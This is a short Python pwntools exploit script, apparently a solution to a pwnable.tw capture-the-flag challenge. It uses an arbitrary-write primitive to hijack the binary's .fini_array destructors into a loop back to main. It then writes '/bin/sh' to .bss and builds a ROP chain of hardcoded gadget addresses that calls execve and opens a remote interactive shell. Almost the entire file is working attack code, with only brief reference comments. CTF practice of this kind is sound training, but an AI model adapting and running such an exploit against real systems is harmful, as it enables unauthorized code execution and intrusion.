from pwn import *

###Utils
def edit(addr,data):
    r.sendlineafter('addr:',str(addr))
    r.sendlineafter('data:',data)

###Useful Addr
fini_array = 0x4b40f0
call_fini_array = 0x402960
main = 0x401b6d
RSP_after_leave = 0x4b4108  #acquired through gdb dynamic analysis
bss = 0x4b92f0

###ROPgadget
leave = 0x401c4b
pop_rax = 0x41e4af
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
syscall = 0x471db5

###Exploit
r = remote('chall.pwnable.tw',10105)
###Hijack .fini_array section and assign destructor to form loop
edit(fini_array,p64(call_fini_array)+p64(main))
###Construct ROPchain
edit(bss,'/bin/sh\x00')
edit(RSP_after_leave+0x00,p64(pop_rax)+p64(59))
edit(RSP_after_leave+0x10,p64(pop_rdi)+p64(bss))
edit(RSP_after_leave+0x20,p64(pop_rsi)+p64(0))
edit(RSP_after_leave+0x30,p64(pop_rdx)+p64(0))
edit(RSP_after_leave+0x40,p64(syscall))
###Terminate loop
edit(fini_array,p64(leave))
###Get shell
r.interactive()


###Reference
#   constructor/destructor
#   https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/index.html
#   .fini_array
#   http://refspecs.linuxbase.org/LSB_3.0.0/LSB-PDA/LSB-PDA/specialsections.html
